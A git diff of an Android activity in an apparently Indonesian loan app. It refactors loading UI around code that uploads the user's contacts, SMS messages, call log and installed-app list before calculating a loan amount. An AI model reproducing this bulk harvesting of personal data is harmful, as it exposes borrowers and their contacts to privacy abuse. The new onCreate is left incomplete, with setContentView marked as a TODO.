@@ -1,16 +1,18 @@
 package com.lemontree.android.ui.activity;
 
 import android.Manifest;
-import android.app.ProgressDialog;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.os.Bundle;
 import android.os.Handler;
-import android.os.Looper;
 import android.view.View;
+import android.widget.ImageView;
 
 import androidx.core.app.ActivityCompat;
+import androidx.core.widget.ContentLoadingProgressBar;
 
+import com.google.android.material.button.MaterialButton;
 import com.google.gson.Gson;
 import com.lemontree.android.R;
 import com.lemontree.android.base.BaseActivity;
@@ -29,14 +31,23 @@ import com.minchainx.permission.util.PermissionListener;
 import com.networklite.NetworkLiteHelper;
 import com.networklite.callback.GenericCallback;
 
+import butterknife.BindView;
+import butterknife.ButterKnife;
 import okhttp3.Call;
+
+import static com.lemontree.android.manager.BaseApplication.mHasUpdateAppListSuccess;
+import static com.lemontree.android.manager.BaseApplication.mHasUpdateCallLogSuccess;
+import static com.lemontree.android.manager.BaseApplication.mHasUpdateSmsSuccess;
+import static com.lemontree.android.manager.BaseApplication.mHasUploadAddressBook;
 
 public class InfoGetReadyActivity extends BaseActivity {
 
-    private boolean mHasUploadAddressBook;
-    private boolean mHasUpdateSmsSuccess;
-    private boolean mHasUpdateAppListSuccess;
-    private boolean mHasUpdateCallLogSuccess;
+    @BindView(R.id.progress_bar)
+    ContentLoadingProgressBar progressBar;
+    @BindView(R.id.iv_ok)
+    ImageView ivOk;
+    @BindView(R.id.btn_confirm)
+    MaterialButton btnConfirm;
 
     public static Intent createIntent(Context context) {
         return new Intent(context, InfoGetReadyActivity.class);
@@ -81,25 +92,33 @@ public class InfoGetReadyActivity extends BaseActivity {
     }
 
     private void uploadAccordingPermissions() {
-        if (isGetNecessaryPermission()) {
-            uploadNecessaryData();
-        }
-        //sms
-        if (isGetSMSPermission()) {
-            if (!mHasUpdateSmsSuccess) {
-                uploadSmsOnly();
+        progressBar.setVisibility(View.VISIBLE);
+        btnConfirm.setText("Lagi menghitung jumlah pinjaman");
+
+        new Handler().postDelayed(() -> {
+
+            if (isGetNecessaryPermission() && !mHasUploadAddressBook) {
+                uploadNecessaryData();
+            } else {//否则直接计算额度
+                calculateAmount();
             }
-        }
-        //call record
-        if (isGetCallLogPermission()) {
-            if (!mHasUpdateCallLogSuccess) {
-                uploadCallRecordOnly();
+            //sms
+            if (isGetSMSPermission()) {
+                if (!mHasUpdateSmsSuccess) {
+                    uploadSmsOnly();
+                }
             }
-        }
-        //app list
-        if (!mHasUpdateAppListSuccess) {
-            uploadAppListOnly();
-        }
+            //call record
+            if (isGetCallLogPermission()) {
+                if (!mHasUpdateCallLogSuccess) {
+                    uploadCallRecordOnly();
+                }
+            }
+            //app list
+            if (!mHasUpdateAppListSuccess) {
+                uploadAppListOnly();
+            }
+        }, 100);
     }
 
     private boolean isGetNecessaryPermission() {
@@ -119,33 +138,17 @@ public class InfoGetReadyActivity extends BaseActivity {
      * 上传数据
      */
     private void uploadNecessaryData() {
-        final ProgressDialog dialog = new ProgressDialog(mContext);
-        dialog.setMessage(getString(R.string.dialog_loading));
-        if (!mContext.isFinishing()) {
-            dialog.show();
-        }
         new UploadNecessaryData().upload(BaseApplication.mUserId, new UploadNecessaryData.UploadDataListener() {
             @Override
             public void success() {
-                new Handler(Looper.getMainLooper()).post(new Runnable() {
-                    @Override
-                    public void run() {
-                        dialog.dismiss();
-//                        调用/app/order/calculationAmt，普通入参
-                        calculateAmount();
-                    }
-                });
+                mHasUploadAddressBook = true;
+                calculateAmount();
             }
 
             @Override
             public void error() {
-
-                new Handler(Looper.getMainLooper()).post(new Runnable() {
-                    @Override
-                    public void run() {
-                        dialog.dismiss();
-                    }
-                });
+                progressBar.setVisibility(View.INVISIBLE);
+                btnConfirm.setText("Dapatkan kredit →");
             }
         });
     }
@@ -210,6 +213,9 @@ public class InfoGetReadyActivity extends BaseActivity {
                 .execute(OKHttpClientEngine.getNetworkClient(), new GenericCallback<GetBankListResBean>() {
                     @Override
                     public void onSuccess(Call call, GetBankListResBean response, int id) {
+                        progressBar.setVisibility(View.INVISIBLE);
+                        btnConfirm.setText("Dapatkan kredit →");
+
                         if (response != null && BaseResponseBean.SUCCESS.equals(response.res_code)) {
                             IntentUtils.gotoMainActivity(mContext, MainActivity.TAB_HOME);
                             finishActivity();
@@ -218,7 +224,16 @@ public class InfoGetReadyActivity extends BaseActivity {
 
                     @Override
                     public void onFailure(Call call, Exception exception, int id) {
+                        progressBar.setVisibility(View.INVISIBLE);
+                        btnConfirm.setText("Dapatkan kredit →");
                     }
                 });
+    }
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        // TODO: add setContentView(...) invocation
+        ButterKnife.bind(this);
     }
 }
